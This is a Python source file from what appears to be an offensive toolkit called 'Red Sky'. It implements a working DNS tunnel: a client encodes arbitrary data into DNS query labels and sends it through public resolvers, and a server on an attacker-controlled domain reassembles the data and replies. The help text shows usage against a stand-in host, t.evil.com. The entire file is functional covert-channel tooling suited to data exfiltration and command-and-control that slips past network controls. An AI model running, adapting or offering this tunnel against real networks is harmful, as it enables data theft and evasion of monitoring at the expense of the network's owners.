# language: Python, file: Program/dns/tunnel.py, target: Red Sky dns — DNS tunnel
# Client/server pair for tunneling data over DNS queries.
#   Encodings: base32, base64 (url-safe), hex
#   Record types: TXT (16), A (1), NULL (10), CNAME (5)
#   Framing: <seq>-<total>-<session>-<payload>.<domain>
# Server side is authoritative for the tunnel domain and echoes back queued data.

import base64
import binascii
import json
import random
import socket
import string
import struct
import sys
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


DNS_DIR = OUTPUT_DIR / "dns"
TUN_DIR = DNS_DIR / "tunnel"
TUN_DIR.mkdir(parents=True, exist_ok=True)


def encode_payload(data: bytes, mode: str) -> str:
    if mode == "base32":
        return base64.b32encode(data).decode("ascii").rstrip("=").lower()
    if mode == "base64":
        return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")
    if mode == "hex":
        return data.hex()
    raise ValueError("unknown encoding: " + mode)


def decode_payload(s: str, mode: str) -> bytes:
    if mode == "base32":
        pad = "=" * ((8 - len(s) % 8) % 8)
        return base64.b32decode(s.upper() + pad)
    if mode == "base64":
        pad = "=" * ((4 - len(s) % 4) % 4)
        return base64.urlsafe_b64decode(s + pad)
    if mode == "hex":
        return bytes.fromhex(s)
    raise ValueError("unknown encoding: " + mode)


def frame(seq: int, total: int, session: str, payload: bytes, mode: str) -> str:
    return "{}-{}-{}-{}".format(seq, total, session, encode_payload(payload, mode))


def unframe(label: str, mode: str) -> Optional[Dict]:
    parts = label.split("-", 3)
    if len(parts) != 4:
        return None
    try:
        seq = int(parts[0]); total = int(parts[1]); session = parts[2]
        payload = decode_payload(parts[3], mode)
    except (ValueError, binascii.Error):
        return None
    return {"seq": seq, "total": total, "session": session, "payload": payload}


DNS_LABEL_MAX = 63
DNS_TOTAL_MAX = 253
FRAME_OVERHEAD = 12


def chunk_payload(data: bytes, mode: str, domain: str) -> List[str]:
    overhead = FRAME_OVERHEAD + len(domain) + 1
    avail = DNS_TOTAL_MAX - overhead
    if mode == "base32":
        per_chunk = (avail * 5) // 8
    elif mode == "base64":
        per_chunk = (avail * 3) // 4
    else:
        per_chunk = avail // 2
    per_chunk = max(1, min(per_chunk, 60))

    chunks = [data[i:i+per_chunk] for i in range(0, len(data), per_chunk)]
    total = len(chunks)
    session = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return [frame(i, total, session, c, mode) for i, c in enumerate(chunks)]


def build_dns_query(name: str, qtype: int = 16, txid: Optional[int] = None) -> bytes:
    if txid is None:
        txid = random.randrange(0, 65536)
    header = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    qname = b""
    for part in name.split("."):
        if not part:
            continue
        b = part.encode("ascii")
        if len(b) > 63:
            b = b[:63]
        qname += bytes([len(b)]) + b
    qname += b"\x00"
    question = qname + struct.pack(">HH", qtype, 1)
    return header + question


def parse_dns_response(data: bytes, qtype: int) -> Optional[bytes]:
    if len(data) < 12:
        return None
    txid, flags, qd, an, ns, ar = struct.unpack(">HHHHHH", data[:12])
    if an == 0:
        return None
    off = 12
    while off < len(data) and data[off] != 0:
        off += data[off] + 1
    off += 5
    for _ in range(an):
        if off >= len(data):
            break
        if data[off] & 0xC0:
            off += 2
        else:
            while off < len(data) and data[off] != 0:
                off += data[off] + 1
            off += 1
        if off + 10 > len(data):
            break
        atype, aclass, ttl, rdlen = struct.unpack(">HHIH", data[off:off+10])
        off += 10
        rdata = data[off:off+rdlen]
        off += rdlen
        if atype == 16 and rdlen >= 1:
            s = b""
            i = 0
            while i < len(rdata):
                n = rdata[i]
                s += rdata[i+1:i+1+n]
                i += 1 + n
            return s
        if atype == 1 and rdlen == 4:
            return rdata
        if atype == 5:
            return rdata
        if atype == 10:
            return rdata
    return None


def resolve_via(server: str, name: str, qtype: int, timeout: float = 3.0) -> Optional[bytes]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(build_dns_query(name, qtype), (server, 53))
        data, _ = s.recvfrom(4096)
        s.close()
        return parse_dns_response(data, qtype)
    except Exception:
        return None


def cmd_send(domain: str, data: str, mode: str, resolver: str, qtype: int,
             out_file: str) -> int:
    print_info("DNS tunnel — client send")
    print_kv("domain", domain)
    print_kv("bytes", len(data))
    print_kv("encoding", mode)
    print_kv("resolver", resolver or "(system default)")
    print()

    chunks = chunk_payload(data.encode(), mode, domain)
    print_kv("chunks", len(chunks))
    print()

    for i, label in enumerate(chunks, 1):
        name = label + "." + domain
        print("  " + ASH + "[" + str(i) + "/" + str(len(chunks)) + "]" + RESET
              + " " + BONE + name[:70] + ("..." if len(name) > 70 else "") + RESET)
        resp = resolve_via(resolver or "8.8.8.8", name, qtype, timeout=3.0)
        if resp:
            print("      " + SCARLET + "reply: " + resp.hex()[:40] + RESET)
        time.sleep(0.1)

    print()
    print_ok("sent " + str(len(chunks)) + " chunk(s)")
    out = Path(out_file) if out_file else TUN_DIR / ("send_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"domain": domain, "chunks": len(chunks),
                               "mode": mode, "qtype": qtype}, indent=2))
    print_kv("saved", out)
    return 0


class TunnelServer:
    def __init__(self, host: str, port: int, domain: str, mode: str, qtype: int):
        self.host = host
        self.port = port
        self.domain = domain.lower().rstrip(".")
        self.mode = mode
        self.qtype = qtype
        self.sessions: Dict[str, Dict] = {}
        self.outbox: Dict[str, List[bytes]] = {}
        self.lock = threading.Lock()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((host, port))

    def _extract_qname(self, data: bytes) -> str:
        off = 12
        parts = []
        while off < len(data) and data[off] != 0:
            n = data[off]
            off += 1
            if off + n > len(data):
                break
            parts.append(data[off:off+n].decode("ascii", errors="replace"))
            off += n
        return ".".join(parts)

    def _parse_txid(self, data: bytes) -> int:
        return struct.unpack(">H", data[:2])[0]

    def _build_reply(self, txid: int, qname: str, payload: bytes) -> bytes:
        header = struct.pack(">HHHHHH", txid, 0x8180, 1, 1, 0, 0)
        qn = b""
        for part in qname.split("."):
            if not part:
                continue
            qn += bytes([len(part)]) + part.encode()
        qn += b"\x00"
        question = qn + struct.pack(">HH", self.qtype, 1)
        if self.qtype == 16:
            txts = b""
            i = 0
            while i < len(payload):
                chunk = payload[i:i+255]
                txts += bytes([len(chunk)]) + chunk
                i += 255
            rdata = txts
        else:
            rdata = payload
        answer = b"\xc0\x0c" + struct.pack(">HHIH", self.qtype, 1, 1, len(rdata)) + rdata
        return header + question + answer

    def run(self):
        print_ok("server listening on " + self.host + ":" + str(self.port))
        print_info("point DNS for *." + self.domain + " at this host")
        print()
        while True:
            try:
                data, addr = self.sock.recvfrom(4096)
            except Exception:
                continue
            qname = self._extract_qname(data)
            qname_lower = qname.lower()
            if not qname_lower.endswith(self.domain):
                continue
            label = qname_lower[:-(len(self.domain)+1)]
            parsed = unframe(label, self.mode)
            if not parsed:
                print("  " + ASH + "non-tunnel query from " + addr[0] + ": " + label[:60] + RESET)
                continue
            sess = parsed["session"]
            with self.lock:
                if sess not in self.sessions:
                    self.sessions[sess] = {"chunks": [None] * parsed["total"], "total": parsed["total"]}
                    self.outbox.setdefault(sess, [])
                self.sessions[sess]["chunks"][parsed["seq"]] = parsed["payload"]
                s = self.sessions[sess]
                if all(c is not None for c in s["chunks"]):
                    full = b"".join(s["chunks"])
                    print(SCARLET + "[query]" + RESET + " " + addr[0] + " session=" + sess
                          + " payload=" + full.decode("utf-8", errors="replace")[:200])
                    self.outbox[sess].append(b"ACK:" + full[:60])
                    s["chunks"] = [None] * s["total"]

            with self.lock:
                replies = self.outbox.get(sess) or []
                payload = replies.pop(0) if replies else b"."
            resp = self._build_reply(self._parse_txid(data), qname, payload)
            self.sock.sendto(resp, addr)


def cmd_serve(host: str, port: int, domain: str, mode: str, qtype: int) -> int:
    print_info("DNS tunnel — server")
    print_kv("host", host)
    print_kv("port", str(port))
    print_kv("domain", domain)
    print_kv("mode", mode)
    print_kv("qtype", str(qtype))
    print()
    print_warn("run on a host with a public IP and a delegated DNS zone")
    print_info("delegate NS records for your tunnel domain to this host")
    print()
    try:
        srv = TunnelServer(host, port, domain, mode, qtype)
        srv.run()
    except KeyboardInterrupt:
        print()
        print_info("shutting down")
    return 0


def cmd_check(domain: str, resolvers_file: str, out_file: str) -> int:
    print_info("DNS tunnel — resolver compatibility check")
    print_kv("domain", domain)
    print()

    default_resolvers = [
        ("8.8.8.8", "Google"), ("8.8.4.4", "Google"),
        ("1.1.1.1", "Cloudflare"), ("1.0.0.1", "Cloudflare"),
        ("9.9.9.9", "Quad9"),
        ("208.67.222.222", "OpenDNS"), ("208.67.220.220", "OpenDNS"),
        ("64.6.64.6", "Verisign"), ("64.6.65.6", "Verisign"),
        ("77.88.8.8", "Yandex"),
    ]
    resolvers = default_resolvers
    if resolvers_file:
        p = Path(resolvers_file).expanduser()
        if p.exists():
            resolvers = []
            for line in p.read_text().splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    ip, _, name = line.partition(" ")
                    resolvers.append((ip, name.strip() or ip))

    probe = "check." + domain
    results = []
    print("  " + ASH + "probing " + str(len(resolvers)) + " resolvers ..." + RESET)
    print()

    for ip, name in resolvers:
        resp_txt = resolve_via(ip, probe, 16, timeout=3.0)
        resp_a   = resolve_via(ip, probe, 1, timeout=3.0)
        row = {"resolver": ip, "name": name, "txt": resp_txt is not None, "a": resp_a is not None}
        results.append(row)
        mark_txt = SCARLET + "TXT" + RESET if row["txt"] else ASH + "---" + RESET
        mark_a   = SCARLET + "A" + RESET if row["a"] else ASH + "---" + RESET
        print("  " + BONE + ip.ljust(18) + RESET + " " + ASH + name.ljust(12) + RESET
              + "  " + mark_txt + "  " + mark_a)

    print()
    ok = sum(1 for r in results if r["txt"])
    print_kv("resolvers answering TXT", str(ok) + "/" + str(len(results)))

    out = Path(out_file) if out_file else TUN_DIR / ("check_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(results, indent=2))
    print_kv("saved", out)
    return 0


def cmd_decode(label: str, mode: str, out_file: str) -> int:
    parsed = unframe(label, mode)
    if not parsed:
        print_err("could not parse label as a tunnel frame")
        return 1
    print_info("decoded frame")
    print_kv("seq", str(parsed["seq"]))
    print_kv("total", str(parsed["total"]))
    print_kv("session", parsed["session"])
    print_kv("payload len", str(len(parsed["payload"])))
    print("  " + CLOT + repr(parsed["payload"][:200]) + RESET)

    out = Path(out_file) if out_file else TUN_DIR / ("decode_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({
        "seq": parsed["seq"], "total": parsed["total"],
        "session": parsed["session"], "payload_hex": parsed["payload"].hex(),
    }, indent=2))
    print_kv("saved", out)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky dns tunnel", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["send", "serve", "check", "decode", "help"])
    p.add_argument("--domain", default="")
    p.add_argument("--data", default="")
    p.add_argument("--mode", default="base32", choices=["base32", "base64", "hex"])
    p.add_argument("--resolver", default="")
    p.add_argument("--qtype", type=int, default=16)
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, default=53)
    p.add_argument("--resolvers", default="")
    p.add_argument("--label", default="")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky dns tunnel <send|serve|check|decode> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("send --domain t.evil.com --data 'hello' [--mode base32] [--resolver 8.8.8.8]")
        print_info("serve --domain t.evil.com [--host 0.0.0.0] [--port 53] [--qtype 16]")
        print_info("check --domain t.evil.com [--resolvers file]")
        print_info("decode --label '0-1-abc123-hexdata' --mode base32")
        print_info("")
        print_info("qtype: 16=TXT (default), 10=NULL, 1=A (4-byte replies), 5=CNAME")
        return 0

    if ns.action == "send":
        if not ns.domain or not ns.data:
            print_err("--domain and --data required")
            return 2
        return cmd_send(ns.domain, ns.data, ns.mode, ns.resolver, ns.qtype, ns.out)
    if ns.action == "serve":
        if not ns.domain:
            print_err("--domain required")
            return 2
        return cmd_serve(ns.host, ns.port, ns.domain, ns.mode, ns.qtype)
    if ns.action == "check":
        if not ns.domain:
            print_err("--domain required")
            return 2
        return cmd_check(ns.domain, ns.resolvers, ns.out)
    if ns.action == "decode":
        if not ns.label:
            print_err("--label required")
            return 2
        return cmd_decode(ns.label, ns.mode, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
